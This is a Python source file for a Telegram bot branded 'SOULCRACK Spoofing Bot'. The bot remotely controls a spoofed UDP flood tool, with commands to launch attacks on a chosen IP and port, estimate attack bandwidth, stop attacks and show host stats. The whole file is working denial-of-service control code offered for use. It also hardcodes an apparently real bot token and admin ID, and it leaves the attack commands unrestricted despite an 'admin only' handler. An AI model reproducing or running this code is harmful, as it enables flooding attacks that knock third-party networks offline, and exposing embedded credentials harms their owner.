#!/usr/bin/env python3
import asyncio
import subprocess
import os
import re
import psutil
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

# Bot configuration
BOT_TOKEN = "5937510175:AAGzZWFRZMoftU-QweEL67vJo2kysBYlJwg"
ADMIN_USER_ID = 5939471267  # Your Telegram User ID

class SpoofingBot:
    def __init__(self):
        self.process = None
        self.is_running = False
        
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Send welcome message"""
        user = update.effective_user
        welcome_text = f"""
🤖 **SOULCRACK Spoofing Bot** 🤖

Welcome {user.mention_html()}!

Available commands:
/start - Show this help
/status - Show current status  
/calc <ip> <port> <time> - Calculate packet size
/attack <ip> <port> <time> - Start attack
/stop - Stop current attack
/stats - Show system statistics

**Example:**
/calc 192.168.1.1 80 30
/attack 192.168.1.1 80 30

⚠️ **Use responsibly!**
        """
        await update.message.reply_html(welcome_text)
    
    async def status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show current attack status"""
        if self.is_running and self.process:
            status_text = "🟢 **Attack RUNNING**\n"
            status_text += f"PID: {self.process.pid}\n"
        else:
            status_text = "🔴 **No active attack**"
        
        await update.message.reply_text(status_text)
    
    async def calculate_size(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Calculate estimated packet sizes and bandwidth"""
        if len(context.args) != 3:
            await update.message.reply_text("❌ Usage: /calc <ip> <port> <time>")
            return
        
        ip, port, duration = context.args
        duration = int(duration)
        
        # Packet size calculations
        min_size = 540    # 20 IP + 8 UDP + 512 payload
        max_size = 1428   # 20 IP + 8 UDP + 1400 payload  
        avg_size = 984    # Average size
        
        # Traffic calculations
        pps = 250000      # Packets per second
        threads = 999
        
        total_packets = pps * duration
        total_data_gb = (total_packets * avg_size) / (1024**3)
        bandwidth_gbps = (pps * avg_size * 8) / 1_000_000_000
        
        # Per thread calculations
        pps_per_thread = pps // threads
        bandwidth_per_thread = (pps_per_thread * avg_size * 8) / 1_000_000
        
        result_text = f"""
📊 **Traffic Calculation for {ip}:{port}**

**Packet Sizes:**
├─ Minimum: {min_size} bytes
├─ Maximum: {max_size} bytes  
└─ Average: {avg_size} bytes

**Attack Profile:**
├─ Duration: {duration} seconds
├─ Threads: {threads:,}
├─ Packets/sec: {pps:,}
├─ PPS/thread: {pps_per_thread:,}

**Estimated Totals:**
├─ Total packets: {total_packets:,}
├─ Total data: {total_data_gb:.2f} GB
├─ Bandwidth: {bandwidth_gbps:.2f} Gbps
└─ Per thread: {bandwidth_per_thread:.2f} Mbps

⚠️ **Theoretical maximum - actual may vary**
        """
        
        await update.message.reply_text(result_text)
    
    async def start_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start the spoofing attack"""
        # Check if already running
        if self.is_running:
            await update.message.reply_text("❌ Attack already running! Use /stop first")
            return
        
        # Validate arguments
        if len(context.args) != 3:
            await update.message.reply_text("❌ Usage: /attack <ip> <port> <time>")
            return
        
        ip, port, duration = context.args
        
        # Validate IP format
        ip_pattern = re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
        if not ip_pattern.match(ip):
            await update.message.reply_text("❌ Invalid IP address format")
            return
        
        # Validate port
        if not (1 <= int(port) <= 65535):
            await update.message.reply_text("❌ Port must be 1-65535")
            return
        
        # Validate duration
        if not (1 <= int(duration) <= 3600):
            await update.message.reply_text("❌ Duration must be 1-3600 seconds")
            return
        
        try:
            # Check if compiled C program exists
            if not os.path.exists("./spoofing"):
                await update.message.reply_text("❌ spoofing binary not found! Compile first: gcc -o spoofing spoofing.c -lpthread")
                return
            
            # Start the attack
            command = ["sudo", "./spoofing", ip, port, duration]
            
            await update.message.reply_text(f"🚀 Starting attack on {ip}:{port} for {duration} seconds...")
            
            # Run in background
            self.process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            self.is_running = True
            
            # Send confirmation
            await update.message.reply_text(
                f"✅ Attack started!\n"
                f"Target: {ip}:{port}\n"
                f"Duration: {duration}s\n"
                f"PID: {self.process.pid}\n\n"
                f"Use /status to check progress\n"
                f"Use /stop to terminate early"
            )
            
            # Monitor process in background
            asyncio.create_task(self.monitor_attack(update, context))
            
        except Exception as e:
            await update.message.reply_text(f"❌ Failed to start attack: {str(e)}")
            self.is_running = False
    
    async def monitor_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Monitor the attack process"""
        try:
            # Wait for process completion
            stdout, stderr = self.process.communicate()
            
            if self.process.returncode == 0:
                # Extract summary from output
                summary = self.extract_summary(stdout)
                await update.message.reply_text(f"✅ Attack completed!\n{summary}")
            else:
                error_msg = stderr if stderr else "Unknown error"
                await update.message.reply_text(f"❌ Attack failed:\n{error_msg}")
                
        except Exception as e:
            await update.message.reply_text(f"⚠️ Attack monitoring error: {str(e)}")
        finally:
            self.is_running = False
            self.process = None
    
    def extract_summary(self, output):
        """Extract summary from C program output"""
        lines = output.split('\n')
        summary = []
        
        for line in lines:
            if any(keyword in line for keyword in ['Total packets', 'Total data', 'Average PPS', 'Total duration']):
                summary.append(line.strip())
        
        return '\n'.join(summary) if summary else "Check console for detailed output"
    
    async def stop_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Stop the current attack"""
        if not self.is_running or not self.process:
            await update.message.reply_text("❌ No active attack to stop")
            return
        
        try:
            # Kill the process and its children
            parent = psutil.Process(self.process.pid)
            children = parent.children(recursive=True)
            
            for child in children:
                child.terminate()
            
            parent.terminate()
            
            # Wait for termination
            gone, still_alive = psutil.wait_procs([parent] + children, timeout=5)
            
            if still_alive:
                for p in still_alive:
                    p.kill()
            
            self.is_running = False
            self.process = None
            
            await update.message.reply_text("🛑 Attack stopped successfully")
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error stopping attack: {str(e)}")
    
    async def show_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show system statistics"""
        try:
            # CPU usage
            cpu_percent = psutil.cpu_percent(interval=1)
            
            # Memory usage
            memory = psutil.virtual_memory()
            
            # Network stats
            net_io = psutil.net_io_counters()
            
            # Disk usage
            disk = psutil.disk_usage('/')
            
            stats_text = f"""
💻 **System Statistics**

**CPU:**
├─ Usage: {cpu_percent}%
├─ Cores: {psutil.cpu_count()}
└─ Frequency: {psutil.cpu_freq().current if psutil.cpu_freq() else 'N/A'} MHz

**Memory:**
├─ Total: {memory.total // (1024**3)} GB
├─ Used: {memory.used // (1024**3)} GB
├─ Free: {memory.available // (1024**3)} GB
└─ Usage: {memory.percent}%

**Network:**
├─ Sent: {net_io.bytes_sent // (1024**2)} MB
├─ Received: {net_io.bytes_recv // (1024**2)} MB
└─ Packets: {net_io.packets_sent} sent, {net_io.packets_recv} recv

**Disk:**
├─ Total: {disk.total // (1024**3)} GB
├─ Used: {disk.used // (1024**3)} GB
└─ Free: {disk.free // (1024**3)} GB

{'🟢 **ATTACK ACTIVE**' if self.is_running else '🔴 **System Ready**'}
            """
            
            await update.message.reply_text(stats_text)
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error getting stats: {str(e)}")
    
    async def unauthorized_access(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle unauthorized access"""
        await update.message.reply_text("❌ Unauthorized access. This bot is for admin use only.")

def main():
    """Start the bot"""
    # Create bot instance
    spoofing_bot = SpoofingBot()
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", spoofing_bot.start))
    application.add_handler(CommandHandler("status", spoofing_bot.status))
    application.add_handler(CommandHandler("calc", spoofing_bot.calculate_size))
    application.add_handler(CommandHandler("attack", spoofing_bot.start_attack))
    application.add_handler(CommandHandler("stop", spoofing_bot.stop_attack))
    application.add_handler(CommandHandler("stats", spoofing_bot.show_stats))
    
    # Add unauthorized access handler
    application.add_handler(MessageHandler(filters.ALL, spoofing_bot.unauthorized_access))
    
    # Start the bot
    print("🤖 SOULCRACK Telegram Bot started!")
    print("Press Ctrl+C to stop")
    
    application.run_polling()

if __name__ == "__main__":
    main()